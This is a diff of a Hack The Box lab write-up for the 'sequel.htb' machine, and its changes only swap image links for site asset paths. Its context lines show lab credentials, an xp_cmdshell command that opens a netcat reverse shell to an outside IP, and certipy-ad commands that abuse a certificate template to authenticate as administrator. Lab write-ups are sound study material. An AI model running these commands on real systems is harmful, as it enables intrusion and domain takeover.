@@ -118,7 +118,7 @@ Creds from excel:
 | NULL   | NULL     | [sa@sequel.htb](mailto:sa@sequel.htb)         | sa     | MSSQLP@ssw0rd!   |
 
 Can either grep and read each line from .xml or change magic bytes to  open xlsx format:
-![[Pasted image 20251116140452.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251116140452.png)
 
 Lateral Movement:
 ```
@@ -134,12 +134,12 @@ EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.76 4444'
 https://github.com/vinsworldcom/NetCat64/releases
 
 
-![[Pasted image 20251116142803.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251116142803.png)
 
 > Pay attention to: sql-Configuration.INI
 New pass to add to creds: 
 WqSZAF6CysDQbGb3 + user ryan 
-![[Pasted image 20251116142839.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251116142839.png)
 
 
 Privesc Winrm ryan session:
@@ -173,7 +173,7 @@ certipy-ad template \
 ```
 
 Modify DunderMifflinAuthentication.json:
-![[Pasted image 20251117122102.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251117122102.png)
 
 ```
 certipy-ad req \
@@ -184,7 +184,7 @@ certipy-ad req \
   -target dc01.sequel.htb \
   -upn administrator@sequel.htb
 ```
-![[Pasted image 20251117122313.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251117122313.png)
 
 ```
 certipy-ad auth \
@@ -192,4 +192,4 @@ certipy-ad auth \
   -domain sequel.htb \
   -dc-ip 10.129.232.128
 ```
-![[Pasted image 20251117122409.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251117122409.png)
